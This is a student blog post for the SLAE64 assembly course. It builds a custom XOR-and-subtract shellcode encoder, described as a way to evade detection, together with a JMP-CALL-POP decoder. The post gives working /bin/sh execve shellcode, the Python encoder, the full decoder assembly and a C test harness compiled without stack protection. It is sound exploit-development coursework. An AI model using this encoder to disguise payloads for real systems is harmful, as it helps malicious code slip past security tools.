---
title: "SLAE64 - Assignment #4 - Custom Encoder"
tags: ["slae64", "assembly", "shellcode", "exploit-development"]
---

## Introduction

This is the blog post for the 4<sup>th</sup> Assignment of the SLAE64 course, which is offered by <a href="https://www.pentesteracademy.com/course?id=7" target="_blank">PentesterAcademy</a>. The course focuses on teaching the basics of 64-bit Assembly language for the Intel Architecture (IA-x86_64) family of processors on the Linux platform.

The purpose of this assignment is to create a custom encoder (encrypter), which obfuscates the shellcode in order to evade detection. The following operations were used: `XOR` each byte with a static key and `SUB` a constant number. 

My code can be found in my Github: <a href="https://github.com/geobour98/slae64" target="_blank">geobour98's Github</a>.

## Encryption

The first thing we want to do is to extract the shellcode from a program that is going to be encrypted. The following `Assembly` program from the course materials calls `execve` syscall, which is used to execute a program, on the executable "/bin/sh".

The whole `Assembly` program is the following:

```nasm
global _start
section .text

_start:

	; first null push
	xor rax, rax
	push rax

	; push /bin//sh in reverse
	mov rbx, 0x68732f2f6e69622f
	push rbx

	; store /bin//sh address in RDI
	mov rdi, rsp

	; second null push
	push rax

	; set RDX
	mov rdx, rsp

	; push address pf /bin//sh
	push rdi
	
	; set RSI
	mov rsi, rsp

	; call execve
	add rax, 59
	syscall
```

In order to extract the shellcode, we first have to compile the `Assembly` code. This process consists of assembling and linking, which are described in previous blog posts. So we will use the bash  script `compile.sh` again.

```shell
geobour98@slae64-dev:~/SLAE/custom/SLAE64/4_Custom_encoder$ ./compile.sh execve-stack
[+] Assembling with Nasm ... 
[+] Linking ... 
[+] Done!
```

Now, in order to actually extract the shellcode from the `execve-stack` executable we use the `objdump` one-liner, which displays information from object files as described previously:

```shell
geobour98@slae64-dev:~/SLAE/custom/SLAE64/4_Custom_encoder$ objdump -d ./execve-stack |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05"
```

After that, paste the extracted shellcode at the `shellcode` variable of the python script `xor-sub-encoder.py`, which performs `XOR` operation on each byte of the shellcode with the static key `0xAA` and then subtracts a constant number, which in our case is `1`. It should be noted that the key of `XOR` must not exist inside the shellcode, because it will lead to a nullbyte (`0x00`).

The whole `Python` script is the following:

```python
#!/usr/bin/python

shellcode = ("\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05")

encoded = ""
encoded2 = ""

sub_value = 1

print 'XOR - SUB Encoded shellcode: \n'

for x in bytearray(shellcode):
	# XOR encoding
	y = (x ^ 0xAA) - sub_value

	encoded += '\\x'
	encoded += '%02x' % y

	encoded2 += '0x'
	encoded2 += '%02x,' % y

print encoded

print encoded2

print 'Shellcode Length: %d\n' % len(bytearray(shellcode))
```

Then we execute the script and get the encrypted shellcode.

```shell
geobour98@slae64-dev:~/SLAE/custom/SLAE64/4_Custom_encoder$ ./xor-sub-encoder.py 
XOR - SUB Encoded shellcode: 

\xe1\x9a\x69\xf9\xe1\x10\x84\xc7\xc2\xc3\x84\x84\xd8\xc1\xf8\xe1\x22\x4c\xf9\xe1\x22\x47\xfc\xe1\x22\x4b\xe1\x28\x69\x90\xa4\xae
0xe1,0x9a,0x69,0xf9,0xe1,0x10,0x84,0xc7,0xc2,0xc3,0x84,0x84,0xd8,0xc1,0xf8,0xe1,0x22,0x4c,0xf9,0xe1,0x22,0x47,0xfc,0xe1,0x22,0x4b,0xe1,0x28,0x69,0x90,0xa4,0xae,
Shellcode Length: 32
```

We copy the shellcode in `NASM` format (`0x`) and paste it in the `Assembly` program (`xor-decoder.nasm`) for decryption.

## Decryption

The technique that is used to decrypt and execute the shellcode is called `JMP-CALL-POP`. We basically jump to a procedure that performs a `call` instruction on another procedure and this inctruction also pushes the address of the next instruction to the stack, which is the shellcode address. Then the `decode` procedure is repeated until all the bytes of the shellcode are decrypted and the shellcode can now get executed, meaning "/bin/sh" gets executed. In the following explanation, the program is explained through its flow.

With the following instruction we make a short jump to the `call_decoder` procedure:

```nasm
	jmp short call_decoder	; jump short to call_decoder procedure
```

The `call_decoder` procedure is declared and the first instruction calls the `decoder` procedure and pushes the memory address of the next instruction to the stack, which is the shellcode. Then, the encrypted bytes of the shellcode are initialized inside another procedure called `Shellcode`. It's important to note that we add another byte to the encrypted shellcode from the `Python` script because even when we don't know the length of the shellcode, it will be calculated dynamically. This happens because the last byte that we add is the same as the `XOR` key and when the operation happens it will result to a nullbyte. That's where the shellcode stops. In our case the value `1` is subtracted from each byte and in order to retrieve the initial value, `1` has to be added to the byte. So, the `XOR` key is `0xaa` and in `Shellcode` we put `0xa9`.

```nasm
call_decoder:

        call decoder
        Shellcode: db 0xe1,0x9a,0x69,0xf9,0xe1,0x10,0x84,0xc7,0xc2,0xc3,0x84,0x84,0xd8,0xc1,0xf8,0xe1,0x22,0x4c,0xf9,0xe1,0x22,0x47,0xfc,0xe1,0x22,0x4b,0xe1,0x28,0x69,0x90,0xa4,0xae,0xa9
```

Then we go to the `decoder` procedure, where the memory address of shellcode is saved at `RSI` register.

```nasm
decoder:
        pop rsi                 ; pop memory address pointing at shellcode from the stack
```

After that, there is the `decode` procedure. We first add `1` to the value of the `RSI` register, so each byte can be XORed with the key and result to the initial value. Then, the actual `XOR` happens between the new value of the `RSI` register and the static key `0xAA`. The next conditional jump checks if the result from the previous `XOR` operation is `0`, meaning the last byte of the shellcode got decrypted. If so, the shellcode gets executed. Otherwise, `RSI` is incremented by 1 to go to the next byte. Finally, the next byte gets decrypted by a short jump at `decode`.

```nasm
decode:
        add byte [rsi], 0x1     ; add 1 byte
        xor byte [rsi], 0xAA    ; xor the added value with the key to retrieve initial value
        jz Shellcode            ; jump if 0 (when the shellcode is decrypted)
        inc rsi                 ; increment esi to go to next byte

        jmp short decode        ; jump short to decode procedure to continue decrypting
```

The whole `Assembly` program is the following:

```nasm
global _start

section .text
_start:

        jmp short call_decoder  ; jump short to call_decoder procedure

decoder:
        pop rsi                 ; pop memory address pointing at shellcode from the stack

decode:
        add byte [rsi], 0x1     ; add 1 byte
        xor byte [rsi], 0xAA    ; xor the added value with the key to retrieve initial value
        jz Shellcode            ; jump if 0 (when the shellcode is decrypted)
        inc rsi                 ; increment esi to go to next byte

        jmp short decode        ; jump short to decode procedure to continue decrypting

call_decoder:

        call decoder
        Shellcode: db 0xe1,0x9a,0x69,0xf9,0xe1,0x10,0x84,0xc7,0xc2,0xc3,0x84,0x84,0xd8,0xc1,0xf8,0xe1,0x22,0x4c,0xf9,0xe1,0x22,0x47,0xfc,0xe1,0x22,0x4b,0xe1,0x28,0x69,0x90,0xa4,0xae,0xa9
```

## Compilation and Testing 

Now we need to compile `xor-decoder.nasm` with the bash script `compile.sh` and extract the shellcode from the generated executable with the `objdump` one-liner.

```shell
geobour98@slae64-dev:~/SLAE/custom/SLAE64/4_Custom_encoder$ ./compile.sh xor-decoder
[+] Assembling with Nasm ... 
[+] Linking ... 
[+] Done!
```

```shell
geobour98@slae64-dev:~/SLAE/custom/SLAE64/4_Custom_encoder$ objdump -d ./xor-decoder |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\xeb\x0e\x5e\x80\x06\x01\x80\x36\xaa\x74\x0a\x48\xff\xc6\xeb\xf3\xe8\xed\xff\xff\xff\xe1\x9a\x69\xf9\xe1\x10\x84\xc7\xc2\xc3\x84\x84\xd8\xc1\xf8\xe1\x22\x4c\xf9\xe1\x22\x47\xfc\xe1\x22\x4b\xe1\x28\x69\x90\xa4\xae\xa9"
```

After that, we modify the `C` program with the shellcode from `objdump`, which was provided in the course materials and checks if a shellcode is working.

The whole `C` program is the following:

```c
#include <stdio.h> 
#include <string.h> 

unsigned char code[] = \ 
"\xeb\x0e\x5e\x80\x06\x01\x80\x36\xaa\x74\x0a\x48\xff\xc6\xeb\xf3\xe8\xed\xff\xff\xff\xe1\x9a\x69\xf9\xe1\x10\x84\xc7\xc2\xc3\x84\x84\xd8\xc1\xf8\xe1\x22\x4c\xf9\xe1\x22\x47\xfc\xe1\x22\x4b\xe1\x28\x69\x90\xa4\xae\xa9";

main() 
{ 
	printf("Shellcode Length: %d\n", strlen(code)); 
	
	int (*ret)() = (int(*)())code; 
	
	ret(); 
}
```

Now we need to compile the `C` program, by disabling the stack protection as well as making the stack executable:

```shell
geobour98@slae64-dev:~/SLAE/custom/SLAE64/4_Custom_encoder$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
```

We test it by just executing `shellcode`.

```shell
geobour98@slae64-dev:~/SLAE/custom/SLAE64/4_Custom_encoder$ ./shellcode 
Shellcode Length: 54
$ id
uid=1000(geobour98) gid=1000(geobour98) groups=1000(geobour98),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
$ ls
compile.sh    execve-stack.nasm  shellcode    xor-decoder	xor-decoder.o
execve-stack  execve-stack.o	 shellcode.c  xor-decoder.nasm	xor-sub-encoder.py
$ exit
geobour98@slae64-dev:~/SLAE/custom/SLAE64/4_Custom_encoder$
```

## Summary

Both the encoder and decoder (encrypter/decrypter) work and we can successfully decrypt the shellcode at runtime and execute it to get a "/bin/sh" shell.

Next will be the Analysis of shellcode samples generated by `msfvenom` (~~msfpayload~~)!

<!-- markdownlint-capture -->
<!-- markdownlint-disable -->
> **SLAE64 Blog Post**
>
> This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
> 
> https://www.pentesteracademy.com/course?id=7
>
> ~~http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/~~
>
> **Student ID: PA-36167**
{: .prompt-info }
<!-- markdownlint-restore -->
